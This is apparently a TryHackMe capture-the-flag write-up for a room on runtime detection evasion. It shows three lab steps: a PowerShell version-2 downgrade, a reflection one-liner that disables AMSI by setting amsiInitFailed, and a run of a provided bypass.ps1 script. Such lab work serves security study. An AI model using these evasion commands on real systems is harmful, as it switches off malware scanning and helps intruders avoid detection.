# Room Information

![]()

Room link: https://tryhackme.com/room/runtimedetectionevasion

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 08/15/2023

# Room Tasks

## PowerShell Downgrade

1. Started up this task's machine

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Downgrade%20pt0.png)

2. `PowerShell -Version <VERSION NUMBER>` from the Windows machine to launch the specified version of PowerShell, for which we'll specify the version 2.0 of PowerShell since this version will allow us to bypass security features that weren't implemented in this version yet, which ended up creating a text file on the machine's desktop containing this task's flag

```PowerShell
C:\Users\THM-Attacker>PowerShell -Version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Downgrade%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Downgrade%20pt2.png)


**TASK COMPLETED!**

## PowerShell Reflection

1. Started up this task's machine
![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Reflection%20pt1.png)

2. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` from the Windows machine to use Reflection to modify and bypass the AMSI (Anti-Malware Scan Interface) utility, which ended up creating a text file on the machine's desktop containing this task's flag
```PowerShell
PS C:\Users\THM-Attacker> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Reflection%20pt2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Reflection%20pt3.png)

## Patching AMSI

1. Started this task's machine
![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Patching%20AMSI%20pt1.png)

2. `.\<EXPLOIT>` from the Windows machine to execute the provided PowerShell executable, which ended up creating a text file on the machine's desktop containing this task's flag
```PowerShell
PS C:\Users\THM-Attacker> .\Desktop\bypass.ps1
True
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Patching%20AMSI%20pt2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Patching%20AMSI%20pt3.png)


**TASK COMPLETED!**
